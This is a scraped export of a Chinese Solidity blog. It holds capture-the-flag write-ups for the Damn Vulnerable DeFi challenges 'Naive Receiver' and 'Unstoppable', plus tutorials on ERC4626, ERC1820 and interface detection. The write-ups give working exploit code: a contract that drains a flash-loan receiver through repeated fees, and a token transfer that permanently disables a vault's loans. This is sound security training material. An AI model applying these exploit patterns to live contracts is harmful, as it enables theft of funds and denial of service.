iszero(eq(sload(pool.slot), caller())) &#123; mstore(0x00, 0x48f5c3ed) revert(0x1c, 0x04) &#125; &#125; if (token != ETH) revert UnsupportedCurrency(); uint256 amountToBeRepaid; // 计算带偿还金额 unchecked &#123; amountToBeRepaid = amount + fee; &#125; _executeActionDuringFlashLoan(); // Return funds to pool ==》 向借贷池还钱 SafeTransferLib.safeTransferETH(pool, amountToBeRepaid); return keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;); &#125; 解读： 贷款人还款的操作，还款 &#x3D; 贷款数目 + 手续费 2.2 NaiveReceiverLenderPool.sol123456789101112131415161718192021222324252627282930313233/** 闪电贷函数 */ function flashLoan( IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data ) external returns (bool) &#123; // receiver 的 ETH 相对应 if (token != ETH) revert UnsupportedCurrency(); // 当前合约的 balance uint256 balanceBefore = address(this).balance; // 向 receiver 转 amount 数目的金额 // Transfer ETH and handle control to receiver SafeTransferLib.safeTransferETH(address(receiver), amount); if(receiver.onFlashLoan( msg.sender, ETH, amount, FIXED_FEE, data ) != CALLBACK_SUCCESS) &#123; revert CallbackFailed(); &#125; if (address(this).balance &lt; balanceBefore + FIXED_FEE) revert RepayFailed(); return true; &#125; 解读： 借贷池 闪电贷函数，贷款和还款在同一笔交易中，保证 贷款人还款之后的金额大于未贷款的金额。 3. solving易知，每一笔贷款都需要缴纳 1ether的手续费，而用户只有 10ether，按理来说只要进行十次借贷操作就可以将用户手中的10个ether花光。如下： 1234567 it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ let ETH = await pool.ETH()； for (let i = 0; i &lt; 10; i++) &#123; await pool.flashLoan(receiver.address, ETH, 0, &quot;0x&quot;); &#125;&#125;); 这样，的结果也是正确的 但是，题目要求在一笔交易中完成，那就很简单了，将这10次调用放在一个合约中即可。 Hack.sol: 1234567891011121314151617181920// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;./FlashLoanReceiver.sol&quot;;import &quot;./NaiveReceiverLenderPool.sol&quot;;contract Hack &#123; address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE; function attack(address payable _pool, address payable _receiver) external &#123; for (uint256 i = 0; i &lt; 10; i++) &#123; NaiveReceiverLenderPool(_pool).flashLoan( IERC3156FlashBorrower(_receiver), ETH, 0 ether, &quot;&quot; ); &#125; &#125;&#125; naive-receiver.challenge.js 123456it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ const AttractContract = await ethers.getContractFactory(&#x27;Hack&#x27;, player); const attracter = await AttractContract.deploy(); await attracter.attack(pool.address, receiver.address); &#125;); 运行结果： 解题成功。","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"damn defi","slug":"Smart-contracts/damn-defi","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"","slug":"Smart contracts/damn defi/ABI Smuggling","date":"2023-07-09T03:37:10.000Z","updated":"2023-07-09T03:37:10.000Z","comments":true,"path":"2023/07/09/Smart contracts/damn defi/ABI Smuggling/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/09/Smart%20contracts/damn%20defi/ABI%20Smuggling/","excerpt":"","text":"1. issue2. analysing3. solving","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"damn defi","slug":"Smart-contracts/damn-defi","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"","slug":"Smart contracts/damn defi/Puppet V3","date":"2023-07-09T03:37:10.000Z","updated":"2023-07-09T03:37:10.000Z","comments":true,"path":"2023/07/09/Smart contracts/damn defi/Puppet V3/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/09/Smart%20contracts/damn%20defi/Puppet%20V3/","excerpt":"","text":"1. issue2. analysing3. solving","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"damn defi","slug":"Smart-contracts/damn-defi","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Unstoppable","slug":"Smart contracts/damn defi/Unstoppable","date":"2023-07-09T03:37:10.000Z","updated":"2023-07-09T03:37:10.000Z","comments":true,"path":"2023/07/09/Smart contracts/damn defi/Unstoppable/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/09/Smart%20contracts/damn%20defi/Unstoppable/","excerpt":"","text":"1. issue There’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends. To pass the challenge, make the vault stop offering flash loans. You start with 10 DVT tokens in balance. 简单来说：就是让这个金库停止提供闪电贷 题目链接 2.analysingReceiverUnstoppable.sol 和 UnstoppableVault.sol 源码链接 由简入难 分析ReceiverUnstoppable.sol: 1234567891011121314function onFlashLoan( address initiator, address token, uint256 amount, uint256 fee, bytes calldata) external returns (bytes32) &#123; if (initiator != address(this) || msg.sender != address(pool) || token != address(pool.asset()) || fee != 0) revert UnexpectedFlashLoan(); ERC20(token).approve(address(pool), amount); return keccak256(&quot;IERC3156FlashBorrower.onFlashLoan&quot;);&#125; ERC20(token).approve(address(pool), amount): ERC20底层代币给UnstoppableVault金库授权，允许金库支配多少数量的金额 123456789function executeFlashLoan(uint256 amount) external onlyOwner &#123; address asset = address(pool.asset()); pool.flashLoan( this, asset, amount, bytes(&quot;&quot;) );&#125; 调用 UnstoppableVault的flashLoan函数 分析UnstoppableVault.sol: 12345678910111213141516171819202122232425262728293031function flashLoan( IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data) external returns (bool) &#123; // 贷款数目不能为0 if (amount == 0) revert InvalidAmount(0); // fail early // 要金库应为当前金库 if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement // balanceBefore = balanceOf(address(this)) =&gt; address(this)=vault uint256 balanceBefore = totalAssets(); // 保险库的总金额 // totalSupply 是铸币是赋值 初始值 = balanceOf(vault) if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement uint256 fee = flashFee(_token, amount); // transfer tokens out + execute callback on receiver ERC20(_token).safeTransfer(address(receiver), amount); // callback must return magic value, otherwise assume it failed if (receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data) != keccak256(&quot;IERC3156FlashBorrower.onFlashLoan&quot;)) revert CallbackFailed(); // pull amount + fee from receiver, then pay the fee to the recipient ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee); ERC20(_token).safeTransfer(feeRecipient, fee); return true;&#125; 要使整个借贷池崩溃很简单，就是将这个借贷函数弄坏（即无法调用），分析可知，只有if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();该条语句才能将借贷函数在底层将其破坏，不受调用者输入参数所影响。 进一步分析： balanceBefore是通过调用 totalAssets() 函数得来的，而 totalAssets() 就是将当前借贷池的余额返回（会受到交易的影响），而 totalSupply 表示金库最大供给额度，只受铸币和销币的影响。 所以，只要在初始化的时候，我们的第一笔交易就是给我们的借贷池转入任意一笔钱，此时 convertToShares(totalSupply) != balanceBefore永远不可能成立，就不能从借贷池贷款了。 注意 convertToShares 函数 12345function convertToShares(uint256 assets) public view virtual returns (uint256) &#123; uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero. return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());&#125; 执行 convertToShares(totalSupply)的结果就是 totalSupply。 3. solvingjs文件中： 12345it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ const attract = token.connect(player); await attract.transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);&#125;); 测试： 通过。","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"damn defi","slug":"Smart-contracts/damn-defi","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"","slug":"Smart contracts/damn defi/Wallet Mining","date":"2023-07-09T03:37:10.000Z","updated":"2023-07-09T03:37:10.000Z","comments":true,"path":"2023/07/09/Smart contracts/damn defi/Wallet Mining/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/09/Smart%20contracts/damn%20defi/Wallet%20Mining/","excerpt":"","text":"1. issue2. analysing3. solving","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"damn defi","slug":"Smart-contracts/damn-defi","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"using 的使用","slug":"Solidity/Basic_Knowledge/Using的使用","date":"2023-07-08T14:47:10.000Z","updated":"2023-07-08T14:47:10.000Z","comments":true,"path":"2023/07/08/Solidity/Basic_Knowledge/Using的使用/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/08/Solidity/Basic_Knowledge/Using%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"1.语法1using A for * // 效果是，库A中的函数被附着在做任意的类型上 指令using A for B;用来附着库里定义的函数(从库A)到任意类型B。这些函数将会默认接收调用函数对象的实例作为第一个参数。 2. 示例代码2.1 Math库合约：123456789101112// 声明一个库合约library Math &#123; // 定义一个加法函数 function add(Test1 test1, uint256 a, uint256 b) external pure returns (uint256) &#123; return a + b; &#125; // 定义一个乘法函数 function mul(uint256 a, uint256 b) external pure returns (uint256) &#123; return a * b; &#125;&#125; 2.2 测试合约：12345678// 测试合约contract Test1 &#123; address owner; function getOwner() external view returns(address) &#123; return owner; &#125;&#125; 2.3 引用库合约：123456789101112131415// 合约中使用库合约contract Calculator&#123; using Math for Test1; // 使用库合约中的加法函数 function add(address _test, uint256 a, uint256 b) external pure returns (uint256) &#123; return Test1(_test).add(a, b); &#125; // 使用库合约中的乘法函数 function mul(uint256 a, uint256 b) external pure returns (uint256) &#123; return Math.mul(a, b); &#125;&#125; 2.4 解读引用库合约using Math for Test1：Test 合约都具有Math合约的功能。 Test1(_test).add(a, b)：从库合约可以知道，add函数的形参为 add(Test1 test1, uint256 a, uint256 b)，在该函数会默认把调用者作为第一个参数，即 Test1合约。 3. 测试3.1 部署 Test1, Calculator 3.2 使用Test1的地址调用add函数 成功调用","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Basic_Knowledge","slug":"Solidity/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Solidity/Basic-Knowledge/"}],"tags":[{"name":"using","slug":"using","permalink":"https://biyouqiuqiu.com/tags/using/"}]},{"title":"ERC2612的理解","slug":"Smart contracts/ERC/ERC2612","date":"2023-07-08T09:47:10.000Z","updated":"2023-07-08T09:47:10.000Z","comments":true,"path":"2023/07/08/Smart contracts/ERC/ERC2612/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/08/Smart%20contracts/ERC/ERC2612/","excerpt":"","text":"","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ERC","slug":"Smart-contracts/ERC","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ERC/"}],"tags":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/tags/Smart-contracts/"},{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC2612","slug":"ERC2612","permalink":"https://biyouqiuqiu.com/tags/ERC2612/"}]},{"title":"ERC4626的理解","slug":"Smart contracts/ERC/ERC4626","date":"2023-07-08T07:47:10.000Z","updated":"2023-07-08T07:47:10.000Z","comments":true,"path":"2023/07/08/Smart contracts/ERC/ERC4626/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/08/Smart%20contracts/ERC/ERC4626/","excerpt":"","text":"1. ERC4626介绍官方文档 WTF学院 简介： 代币化保险库标准，也称为ERC-4626，是一种代币化保险库的标准协议，代表着可产生收益的代币份额，并基于ERC-20代币标准进行构建。 换句话说，ERC-4626是ERC-20的扩展，增加了新的功能，允许用户从他们的股份中获利。以前使用ERC-20标准，用户只能提取不超过他们在账户中存入的代币数量。ERC-4626允许用户根据保险库产生的利润数量，在一段时间内提取超过其初始付款的金额。 作为ERC-20的扩展，ERC-4626实现了以下功能： 存款和提取 保险库余额 接口 事件 2. ERC4626合约ERC4626源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// SPDX-License-Identifier: MIT// OpenZeppelin Contracts (last updated v4.9.0) (interfaces/IERC4626.sol)pragma solidity ^0.8.19;import &#123;IERC20&#125; from &quot;../token/ERC20/IERC20.sol&quot;;import &#123;IERC20Metadata&#125; from &quot;../token/ERC20/extensions/IERC20Metadata.sol&quot;;interface IERC4626 is IERC20, IERC20Metadata &#123; event Deposit(address indexed sender, address indexed owner, uint256 assets, uint256 shares); event Withdraw( address indexed sender, address indexed receiver, address indexed owner, uint256 assets, uint256 shares ); function asset() external view returns (address assetTokenAddress); function totalAssets() external view returns (uint256 totalManagedAssets); function convertToShares(uint256 assets) external view returns (uint256 shares); function convertToAssets(uint256 shares) external view returns (uint256 assets); function maxDeposit(address receiver) external view returns (uint256 maxAssets); function previewDeposit(uint256 assets) external view returns (uint256 shares); function deposit(uint256 assets, address receiver) external returns (uint256 shares); function maxMint(address receiver) external view returns (uint256 maxShares); function previewMint(uint256 shares) external view returns (uint256 assets); function mint(uint256 shares, address receiver) external returns (uint256 assets); function maxWithdraw(address owner) external view returns (uint256 maxAssets); function previewWithdraw(uint256 assets) external view returns (uint256 shares);ose methods should be performed separately. function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares); function maxRedeem(address owner) external view returns (uint256 maxShares); function previewRedeem(uint256 shares) external view returns (uint256 assets); function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);&#125; 3. 合约解读3.1 方法ERC4626 协议是基于 ERC-20 代币标准的扩展，它为收益保险库增加了一些基本功能，如存入、取出代币和读取余额。ERC4626 协议定义了以下方法： asset(): 返回保险库使用的底层代币的地址，必须是一个 ERC-20 合约。 totalAssets(): 返回保险库持有的底层资产的总量，应该包括任何由收益产生的复利。 convertToShares(): 返回保险库为给定数量的底层资产兑换的份额数量。 convertToAssets(): 返回保险库为给定数量的份额兑换的底层资产数量。 maxDeposit(): 返回接收者在单次存款调用中可以存入的底层资产的最大数量。 previewDeposit(): 允许用户在当前区块模拟他们的存款效果。 deposit(): 将底层资产存入保险库，并将份额授予接收者。 maxMint(): 返回接收者在单次铸造调用中可以铸造的份额的最大数量。 previewMint(): 允许用户在当前区块模拟他们的铸造效果。 mint(): 将份额铸造给接收者，并从保险库中取出相应数量的底层资产。 maxWithdraw(): 返回接收者在单次取款调用中可以取出的底层资产的最大数量。 previewWithdraw(): 允许用户在当前区块模拟他们的取款效果。 withdraw(): 将份额从接收者处销毁，并将相应数量的底层资产从保险库中取出。 maxRedeem(): 返回接收者在单次赎回调用中可以赎回的份额的最大数量。 previewRedeem(): 允许用户在当前区块模拟他们的赎回效果。 redeem(): 将份额从接收者处销毁，并将相应数量的底层资产从保险库中取出。 3.2 事件ERC4626 协议还定义了以下事件： Deposit: 当用户存入底层资产时触发，包含存入者、接收者、存入金额和获得份额数。 Mint: 当用户铸造份额时触发，包含铸造者、接收者、铸造金额和取出资产数。 Withdraw: 当用户取出底层资产时触发，包含取出者、接收者、取出金额和销毁份额数。 Redeem: 当用户赎回份额时触发，包含赎回者、接收者、赎回金额和取出资产数。 参考链接","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ERC","slug":"Smart-contracts/ERC","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ERC/"}],"tags":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/tags/Smart-contracts/"},{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC4626","slug":"ERC4626","permalink":"https://biyouqiuqiu.com/tags/ERC4626/"}]},{"title":"判断合约是否实现某接口","slug":"Solidity/Utils/判断合约是否实现某接口","date":"2023-07-08T03:47:10.000Z","updated":"2023-07-08T03:47:10.000Z","comments":true,"path":"2023/07/08/Solidity/Utils/判断合约是否实现某接口/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/08/Solidity/Utils/%E5%88%A4%E6%96%AD%E5%90%88%E7%BA%A6%E6%98%AF%E5%90%A6%E5%AE%9E%E7%8E%B0%E6%9F%90%E6%8E%A5%E5%8F%A3/","excerpt":"","text":"1. 计算代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647pragma solidity ^0.4.20;contract TestContractID &#123; bytes4 constant InvalidID = 0xffffffff; bytes4 constant ToTestContractID = ; // 你想查看的 InterfaceID function doesContractImplementInterface(address _contract, bytes4 _interfaceId) external view returns (bool) &#123; uint256 success; uint256 result; (success, result) = noThrowCall(_contract, ToTestContractID); if ((success==0)||(result==0)) &#123; return false; &#125; (success, result) = noThrowCall(_contract, InvalidID); if ((success==0)||(result!=0)) &#123; return false; &#125; (success, result) = noThrowCall(_contract, _interfaceId); if ((success==1)&amp;&amp;(result==1)) &#123; return true; &#125; return false; &#125; function noThrowCall(address _contract, bytes4 _interfaceId) constant internal returns (uint256 success, uint256 result) &#123; bytes4 toTestContractID = ToTestContractID; assembly &#123; let x := mload(0x40) // Find empty storage location using &quot;free memory pointer&quot; mstore(x, toTestContractID) // Place signature at beginning of empty storage mstore(add(x, 0x04), _interfaceId) // Place first argument directly next to signature success := staticcall( 30000, // 30k gas _contract, // To addr x, // Inputs are stored at location x 0x24, // Inputs are 36 bytes long x, // Store output over input (saves space) 0x20) // Outputs are 32 bytes long result := mload(x) // Load the result &#125; &#125;&#125; 2. 实例演示以IERC165为例： 12345678910111213141516171819// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface IERC165 &#123; function supportsInterface(bytes4 interfaceID) external view returns (bool);&#125;contract ERC165 is IERC165 &#123; // 计算`IERC165`接口的标识符 function cal1() public pure returns(bytes4) &#123; return bytes4(keccak256(&quot;supportsInterface(bytes4)&quot;)); &#125; function supportsInterface(bytes4 interfaceId) external pure returns (bool)&#123; return interfaceId == type(IERC165).interfaceId; &#125;&#125; 易算出，IERC165的标识符为：0x01ffc9a7 部署ERC165合约，获取合约地址：0x9D7f74d0C41E726EC95884E0e97Fa6129e3b5E99 计算合约： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546pragma solidity ^0.4.20;contract ERC165Query &#123; bytes4 constant InvalidID = 0xffffffff; bytes4 constant ERC165ID = 0x01ffc9a7; function doesContractImplementInterface(address _contract, bytes4 _interfaceId) external view returns (bool) &#123; uint256 success; uint256 result; (success, result) = noThrowCall(_contract, ERC165ID); if ((success==0)||(result==0)) &#123; return false; &#125; (success, result) = noThrowCall(_contract, InvalidID); if ((success==0)||(result!=0)) &#123; return false; &#125; (success, result) = noThrowCall(_contract, _interfaceId); if ((success==1)&amp;&amp;(result==1)) &#123; return true; &#125; return false; &#125; function noThrowCall(address _contract, bytes4 _interfaceId) constant internal returns (uint256 success, uint256 result) &#123; bytes4 erc165ID = ERC165ID; assembly &#123; let x := mload(0x40) // Find empty storage location using &quot;free memory pointer&quot; mstore(x, erc165ID) // Place signature at beginning of empty storage mstore(add(x, 0x04), _interfaceId) // Place first argument directly next to signature success := staticcall( 30000, // 30k gas _contract, // To addr x, // Inputs are stored at location x 0x24, // Inputs are 36 bytes long x, // Store output over input (saves space) 0x20) // Outputs are 32 bytes long result := mload(x) // Load the result &#125; &#125;&#125; 部署ERC165Query合约，调用doesContractImplementInterface()函数 结果返回true~","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Utils","slug":"Solidity/Utils","permalink":"https://biyouqiuqiu.com/categories/Solidity/Utils/"}],"tags":[{"name":"interface","slug":"interface","permalink":"https://biyouqiuqiu.com/tags/interface/"}]},{"title":"ERC1820的理解","slug":"Smart contracts/ERC/ERC1820","date":"2023-07-08T01:47:10.000Z","updated":"2023-07-08T01:47:10.000Z","comments":true,"path":"2023/07/08/Smart contracts/ERC/ERC1820/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/08/Smart%20contracts/ERC/ERC1820/","excerpt":"","text":"1. ERC1820介绍ERC1820标准定义了一个通用注册表合约，任何地址（合约或普通用户帐户）都可以注册它支持的接口以及哪个智能合约负责接口实现。 ERC1820标准向后兼容 ERC165 。 ERC1820详情 2. 理解ERC1820最主要的两个函数： 可以为任何地址设置接口实现的的合约，必须调用ERC1820注册表的以下函数： 123456789101112131415function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external &#123; address addr = _addr == address(0) ? msg.sender : _addr; require(getManager(addr) == msg.sender, &quot;Not the manager&quot;); require(!isERC165Interface(_interfaceHash), &quot;Must not be an ERC165 hash&quot;); if (_implementer != address(0) &amp;&amp; _implementer != msg.sender) &#123; require( ERC1820ImplementerInterface(_implementer) .canImplementInterfaceForAddress(_interfaceHash, addr) == ERC1820_ACCEPT_MAGIC, &quot;Does not implement the interface&quot; ); &#125; interfaces[addr][_interfaceHash] = _implementer; emit InterfaceImplementerSet(addr, _interfaceHash, _implementer); &#125; 设置实现某个地址上某个接口的合约地址。需要由管理员来设置。 注意: 如果 _addr 和 implementer 是两个不同的地址，则： _implementer 必须实现 ERC1820ImplementerInterface 接口。 在_implementer上用函数 _addr _interfaceHash 调用 canImplementInterfaceForAddress 时，必须返回 ERC1820_ACCEPT_MAGIC。 注意: _interfaceHash 不能是 ERC165 接口，即不能以28个字节0结尾。 注意: _addr 可以为 0， 则假定为 msg.sender 。 此默认值通过multisig简化了交互，其中要签名的交易数据是常量，而不用管multisig实例的地址。 任何人都可以使用 getInterfaceImplementer 函数查询ERC1820注册表以获取代表某个地址实现接口的合约的地址。 12345678function getInterfaceImplementer(address _addr, bytes32 _interfaceHash) external view returns (address) &#123; address addr = _addr == address(0) ? msg.sender : _addr; if (isERC165Interface(_interfaceHash)) &#123; bytes4 erc165InterfaceHash = bytes4(_interfaceHash); return implementsERC165Interface(addr, erc165InterfaceHash) ? addr : address(0); &#125; return interfaces[addr][_interfaceHash]; &#125; 查询地址是否实现了接口以及通过哪个合约实现。 注意: 如果_interfaceHash的最后28个字节是零（0），那么前4个字节被认为是ERC165接口，注册表合约应该将调用转发到 _addr 合约，检查它是否实现了 ERC165接口（_interfaceHash的前4个字节）。 注册表合约还应缓存ERC165查询以减少gas消耗。 任何人都可以调用 erc165UpdateCache 函数来更新合约是否实现了一个接口。 注意: _addr 可以为 0， 则假定为 msg.sender。此缺省值与setInterfaceImplementer函数的行为一致，并通过multisigs简化了交互，其中要签名的交易数据是常量，而不管multisig实例的地址如何。 3. 合约解释IERC1820123456789101112pragma solidity 0.5.3;// IV is value needed to have a vanity address starting with &#x27;0x1820&#x27;.// IV: 53759/// @dev 如果合约为其他的地址实现了接口， 则必须实现这个接口。interface ERC1820ImplementerInterface &#123; /// @notice 指示合约是否为地址 “addr” 实现接口 “interfaceHash”。 /// @param interfaceHash 接口名称的 keccak256 哈希值 /// @param addr 为哪一个地址实现接口 /// @return 只有当合约为地址&#x27;addr&#x27;实现&#x27;interfaceHash&#x27;时返回 ERC1820_ACCEPT_MAGIC function canImplementInterfaceForAddress(bytes32 interfaceHash, address addr) external view returns(bytes32);&#125; ERC1820Registry123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173pragma solidity 0.5.3;// IV is value needed to have a vanity address starting with &#x27;0x1820&#x27;.// IV: 53759/// @dev 如果合约为其他的地址实现了接口， 则必须实现这个接口。interface ERC1820ImplementerInterface &#123; /// @notice 指示合约是否为地址 “addr” 实现接口 “interfaceHash”。 /// @param interfaceHash 接口名称的 keccak256 哈希值 /// @param addr 为哪一个地址实现接口 /// @return 只有当合约为地址&#x27;addr&#x27;实现&#x27;interfaceHash&#x27;时返回 ERC1820_ACCEPT_MAGIC function canImplementInterfaceForAddress(bytes32 interfaceHash, address addr) external view returns(bytes32);&#125;/// @title ERC1820 伪自省注册表合约/// @notice 该合约是ERC1820注册表的官方实现。contract ERC1820Registry &#123; /// @notice ERC165 无效 ID. bytes4 constant internal INVALID_ID = 0xffffffff; /// @notice ERC165 的 supportsInterface 接口ID (= `bytes4(keccak256(&#x27;supportsInterface(bytes4)&#x27;))`). bytes4 constant internal ERC165ID = 0x01ffc9a7; /// @notice 如果合约代表某个其他地址实现接口，则返回Magic值。 bytes32 constant internal ERC1820_ACCEPT_MAGIC = keccak256(abi.encodePacked(&quot;ERC1820_ACCEPT_MAGIC&quot;)); /// @notice 映射地址及接口到对应的实现合约地址 mapping(address =&gt; mapping(bytes32 =&gt; address)) internal interfaces; /// @notice 映射地址到管理者 mapping(address =&gt; address) internal managers; /// @notice 每个地址和erc165接口的flag，指示是否被缓存。 mapping(address =&gt; mapping(bytes4 =&gt; bool)) internal erc165Cached; /// @notice 表示合约是&#x27;addr&#x27;的&#x27;interfaceHash&#x27;的&#x27;实现者&#x27;。 event InterfaceImplementerSet(address indexed addr, bytes32 indexed interfaceHash, address indexed implementer); /// @notice 表示&#x27;newManager&#x27;是&#x27;addr&#x27;的新管理者的地址。 event ManagerChanged(address indexed addr, address indexed newManager); /// @notice 查询地址是否实现了接口以及通过哪个合约实现的。 /// @param _addr 查询地址（如果&#x27;_addr&#x27;是零地址，则假定为&#x27;msg.sender&#x27;）。 /// @param _interfaceHash 查询接口，它是接口名称字符串的 keccak256 哈希值 /// 例如: &#x27;web3.utils.keccak256(&quot;ERC777TokensRecipient&quot;)&#x27; 表示 &#x27;ERC777TokensRecipient&#x27; 接口. /// @return 返回实现者的地址，没有实现返回 ‘0’ function getInterfaceImplementer(address _addr, bytes32 _interfaceHash) external view returns (address) &#123; address addr = _addr == address(0) ? msg.sender : _addr; if (isERC165Interface(_interfaceHash)) &#123; bytes4 erc165InterfaceHash = bytes4(_interfaceHash); return implementsERC165Interface(addr, erc165InterfaceHash) ? addr : address(0); &#125; return interfaces[addr][_interfaceHash]; &#125; /// @notice 设置某个地址的接口由哪个合约实现，需要由管理员来设置。（每个地址是他自己的管理员，直到设置了一个新的地址）。 /// @param _addr 待设置的关联接口的地址（如果&#x27;_addr&#x27;是零地址，则假定为&#x27;msg.sender&#x27;） /// @param _interfaceHash 接口，它是接口名称字符串的 keccak256 哈希值 /// 例如: &#x27;web3.utils.keccak256(&quot;ERC777TokensRecipient&quot;)&#x27; 表示 &#x27;ERC777TokensRecipient&#x27; 接口。 /// @param _implementer 为地址&#x27;_addr&#x27;实现了 &#x27;_interfaceHash&#x27;接口的合约地址 function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external &#123; address addr = _addr == address(0) ? msg.sender : _addr; require(getManager(addr) == msg.sender, &quot;Not the manager&quot;); require(!isERC165Interface(_interfaceHash), &quot;Must not be an ERC165 hash&quot;); if (_implementer != address(0) &amp;&amp; _implementer != msg.sender) &#123; require( ERC1820ImplementerInterface(_implementer) .canImplementInterfaceForAddress(_interfaceHash, addr) == ERC1820_ACCEPT_MAGIC, &quot;Does not implement the interface&quot; ); &#125; interfaces[addr][_interfaceHash] = _implementer; emit InterfaceImplementerSet(addr, _interfaceHash, _implementer); &#125; /// @notice 为地址_addr 设置新的管理员地址_newManager， 新的管理员能给&#x27;_addr&#x27; 调用 &#x27;setInterfaceImplementer&#x27; 设置是实现者。 /// (传 &#x27;0x0&#x27; 为地址_addr 重置管理员) function setManager(address _addr, address _newManager) external &#123; require(getManager(_addr) == msg.sender, &quot;Not the manager&quot;); managers[_addr] = _newManager == _addr ? address(0) : _newManager; emit ManagerChanged(_addr, _newManager); &#125; /// @notice 获取地址 _addr的管理员 function getManager(address _addr) public view returns(address) &#123; // By default the manager of an address is the same address if (managers[_addr] == address(0)) &#123; return _addr; &#125; else &#123; return managers[_addr]; &#125; &#125; /// @notice 计算给定名称的接口的keccak256哈希值。 function interfaceHash(string calldata _interfaceName) external pure returns(bytes32) &#123; return keccak256(abi.encodePacked(_interfaceName)); &#125; /** --- ERC165 相关方法 --- **/ /// @notice 更新合约是否实现了ERC165接口的缓存。 function updateERC165Cache(address _contract, bytes4 _interfaceId) external &#123; interfaces[_contract][_interfaceId] = 